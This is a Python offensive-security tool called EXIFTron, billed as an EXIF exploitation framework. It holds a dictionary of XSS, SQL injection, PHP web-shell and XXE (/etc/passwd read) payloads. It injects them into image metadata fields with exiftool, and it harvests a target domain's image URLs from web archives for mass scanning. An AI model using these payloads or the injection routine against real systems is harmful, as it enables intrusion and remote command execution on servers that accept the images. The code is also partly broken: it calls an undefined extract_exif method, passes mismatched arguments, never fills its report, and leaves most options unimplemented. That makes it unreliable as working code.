#!/usr/bin/env python3
import os
import sys
import json
import argparse
import subprocess
import requests
import shutil
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from PIL import Image
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich.table import Table
from rich.markdown import Markdown
from urllib.parse import urlparse, urljoin

# UI Configuration
console = Console()
error_console = Console(stderr=True, style="bold red")
ROOT = Path(__file__).parent.resolve()
DOWNLOAD_DIR = ROOT / "downloaded_images"

class EXIFTron:
    def __init__(self):
        self.payloads = {
            'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
            'sqli': ["' OR 1=1 --", '" OR "1"="1'],
            'rce': ['<?php system($_GET["cmd"]); ?>', '<?=`$_GET[0]`?>'],
            'xxe': ['<!ENTITY xxe SYSTEM "file:///etc/passwd">']
        }
        self.report_data = []

    def show_banner(self):
        banner = Markdown("""
        # 🛡️ EXIFTron - Ultimate EXIF Exploitation Framework
        **Version**: 4.0 | **Author**: @Kdairatchi
        """)
        console.print(Panel(banner, style="bold blue"))

    def check_dependencies(self):
        required = {
            'exiftool': 'exiftool',
            'waybackurls': 'waybackurls',
            'waymore': 'waymore',
            'ffmpeg': 'ffmpeg'
        }
        missing = []
        for name, cmd in required.items():
            if not shutil.which(cmd):
                missing.append(name)
        return missing

    def generate_image(self, payload_type):
        img_path = ROOT / f"payload_{payload_type}.jpg"
        Image.new('RGB', (800, 800), color='red').save(img_path)

        with Progress() as progress:
            task = progress.add_task("[cyan]Injecting payloads...", total=4)
            for field in ['Comment', 'Artist', 'Copyright', 'Software']:
                subprocess.run([
                    'exiftool',
                    f'-{field}={self.payloads[payload_type][0]}',
                    '-overwrite_original',
                    str(img_path)
                ], capture_output=True)
                progress.update(task, advance=1)
        return img_path

    def download_image(self, url):
        try:
            os.makedirs(DOWNLOAD_DIR, exist_ok=True)
            file_name = os.path.basename(urlparse(url).path)
            file_path = DOWNLOAD_DIR / file_name
            
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(file_path, "wb") as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
                return file_path
            else:
                return None
        except Exception as e:
            error_console.print(f"Download failed: {e}")
            return None

    def harvest_urls(self, domain):
        console.print(f"[bold green]🚀 Harvesting URLs for {domain}...[/bold green]")
        urls = []

        try:
            wayback = subprocess.run(['waybackurls', domain], capture_output=True, text=True)
            urls.extend(wayback.stdout.splitlines())

            waymore = subprocess.run(['waymore', '-i', domain], capture_output=True, text=True)
            urls.extend(waymore.stdout.splitlines())
        except Exception as e:
            error_console.print(f"Wayback extraction error: {e}")

        return urls

    def batch_scan(self, file_list):
        with open(file_list, 'r') as f:
            urls = [line.strip() for line in f.readlines()]
        self.mass_scan(urls)

    def mass_scan(self, domain, workers=10):
        console.print(f"[bold yellow]🔍 Starting mass scan of {domain}[/bold yellow]")
        urls = self.harvest_urls(domain)
        image_urls = [u for u in urls if u.lower().endswith(('.jpg', '.jpeg', '.png'))]

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(self._scan_url, url): url for url in image_urls}

            with Progress() as progress:
                task = progress.add_task("Scanning URLs", total=len(futures))
                for future in futures:
                    future.add_done_callback(lambda _: progress.update(task, advance=1))

        self.generate_report()

    def _scan_url(self, url):
        try:
            image_path = self.download_image(url)
            if not image_path:
                return None

            metadata = subprocess.run(
                ['exiftool', '-j', str(image_path)],
                capture_output=True,
                text=True
            )

            return json.loads(metadata.stdout)[0]
        except Exception as e:
            return {'error': str(e)}

    def generate_report(self):
        table = Table(title="📊 Scan Results", show_header=True, header_style="bold magenta")
        table.add_column("URL", style="cyan")
        table.add_column("Vulnerabilities", style="red")
        table.add_column("GPS Data", style="green")

        for entry in self.report_data:
            vulns = []
            if entry.get('xss'):
                vulns.append("XSS")
            if entry.get('sqli'):
                vulns.append("SQLi")

            table.add_row(
                entry['url'],
                ", ".join(vulns) if vulns else "None",
                entry.get('GPS', 'N/A')
            )

        console.print(Panel(table, title="Final Report"))

if __name__ == "__main__":
    tool = EXIFTron()

    parser = argparse.ArgumentParser(description="EXIFTron: Automated EXIF Exploitation Framework")
    parser.add_argument("-i", "--image", help="Path to the image file")
    parser.add_argument("-u", "--url", help="Extract EXIF from an image URL")
    parser.add_argument("-d", "--domain", help="Scan an entire domain for images with EXIF metadata")
    parser.add_argument("-w", "--wayback", action="store_true", help="Extract images from Wayback Machine")
    parser.add_argument("-b", "--batch", help="Batch process all images in a folder")
    parser.add_argument("-e", "--extract", action="store_true", help="Extract EXIF data")
    parser.add_argument("-c", "--clean", action="store_true", help="Remove EXIF metadata")
    parser.add_argument("-g", "--gps", action="store_true", help="Extract GPS coordinates and map link")
    parser.add_argument("-r", "--reverse", action="store_true", help="Perform reverse image search")
    parser.add_argument("-a", "--attack", action="store_true", help="Automate EXIF-based attacks")
    parser.add_argument("-p", "--payload", help="Inject a payload into EXIF metadata")
    parser.add_argument("-f", "--field", default="Comment", help="EXIF field to inject payload (default: Comment)")
    parser.add_argument("-report", "--report", action="store_true", help="Generate a full EXIF security report")

    args = parser.parse_args()

    if args.wayback and args.domain:
        tool.mass_scan(args.domain)
    elif args.domain:
        tool.mass_scan(args.domain)
    elif args.image:
        tool.extract_exif(args.image)
    else:
        parser.print_help()
